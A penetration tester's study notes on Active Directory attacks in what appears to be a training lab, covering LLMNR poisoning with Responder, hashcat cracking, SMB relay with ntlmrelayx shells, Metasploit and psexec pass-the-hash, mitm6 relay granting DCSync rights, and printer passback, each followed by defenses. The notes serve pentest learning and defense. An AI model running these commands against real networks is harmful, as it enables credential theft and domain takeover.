### LLMNR  (Link Local Multicast Name Resoultion)
Used to identify hosts when DNS fails, previously called NBT-NS  
`/usr/share/responder/Responder.py -I eht0 -rdw -v `  
`sudo responder -I tun0 -dwP`   

find the MODE -m needed for hashcat  
`hashcat --help | grep -i ntlm `  
**crack found hashes**  
`hashcat -m 5600 hashes.txt rockyou.txt`  
`hashcat -m 5600 hashes.txt rockyou.txt --show`   -- show already found passwords  
`hashcat -m 5600 hashes.txt rockyou.txt -r OneRule` -- mutates hashes list with additional permutations  
*rockyou2021 is 91gb.. better for real world scenarios*  
`hashcat -m 5600 hashes.txt rockyou.txt -O` -- optimizes hardware for metal pw cracker  

#### LLMNR Defense
Disable LLMNR "Turn OFF Multicast Name Resolution" :: GPO-> local computer ->comp configuration->admin template->Network DNS Client   
Disable NBT-NS :: Network Connections -> Network Adapter Prop -> TCP IPV4 -> Advanced -> Wins -> Disable NetBIOS over TCP/IP  
Require Network Access Control (NAC)  
Require strong passwords >14 charcaters  

***  

### SMB Relay   
Instead of cracking hashes, relay those hashes to machines for access.  [[SMB]] #SMB 
SMB signing must be disabled or not enforced  
Relayed credentials should be admin to be useful  

***Identify HOSTS without SMB Signing  ***  
`nmap --script=smb2-security-mode.nse -p445 192.168.176.0/24`  

1. Modify responder to turn off SMB/HTTP so we can relay hashes, instead of capturing   
`sudo mousepad /etc/responder/Responder.conf`  
2. Run responder `sudo responder -I eth0 -dwP`    
3. Setup RELAY `sudo ntlmrelayx.py -tf targets.txt -smb2support`  
targets.txt has hsots without SMB signing enforced/enabled  

`sudo ntlmrelayx.py -tf targets.txt -smb2support -i`  spawns interactive shell  `nc 127.0.0.1 11000`  
`sudo ntlmrelayx.py -tf targets.txt -smb2support -c "whoami"`   runs commmand listed by -c   

#### SMB Relay Defense
Enable SMB Signing on all devices  
Disable NTLM Auth on network  
Account tiering  
Local Admin restriction  
***  
### Gaining Shell Access  
#### MetaSploit
[[METASPLOIT]]
`use exploit/windows/smb/psexec`  
`set payload windows/x64/meterpreter/reverse_tcp`
RHOSTS:192.168.176.137 smbdomain:Marvel.local smbUser:fcastle SMBPass:Password1  --> EXPLOIT  

#### psexec.py
`psexec.py marvel.local/fcastle:'Password1'@192.168.176.137`   - Less noisy  than metasploit  
`psexec.py administrator@192.168.176.137 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f`  

can also try `wmiexec.py` or `smbexec.py`   
***

### IPv6 Attacks   
`sudo mitm6 -d marvel.local`  
`sudo ntlmrelayx.py -6 -t ldaps://192.168.176.121 -wh fakewpad.marvel.local -l lootme`  
It creates new users, and modifies root domain ACL with replication privs:   
 ` "User dIVShTPABW now has Replication-Get-Changes-All privileges on the domain [*] Try using DCSync with secretsdump.py and this user :) `  

#### IPv6 Mitigations
Block DHCPv6 traffic  and incoming router advertiseiemts in Win Firewall via GPO  
- Inbound core networking - dynamic host configuration protocol for ipv6(dhcpv6-in)  
- Inbound core networking - Router Advertisement (ivmpv6-in)  
- outbound core networking - dhcp fo ipv6(dhcpv6-out)  
Disable WPAD if not needed viw GPO and disabling service "WinHttpAutoProxySvc" Service  
Enable both LDAP signing and LDAP channel binding  - prevents LDAP relaying  
Add admins to protected users group, and sensitive and cannot be delegated, to prevent impersonation of the user via delegation  
***
### Passback Attack - MFP
If you can find a MFP, printer/scanner, with LDAP credenetials.. change the IP for DC to your attack workstaiton, start responder or NC.. 
***  
### Initial Strategy  
1. Begin day with Responder or mitm6  #mitm6 #responder #strategy
3. Run scans, nessus/vuln, to generate traffic  
4. If scans are taking to long, look for websites in scope (http_version)  
5. Look for default credentials on web logins (printers/jenkins/etc)  
6. Think outside the box

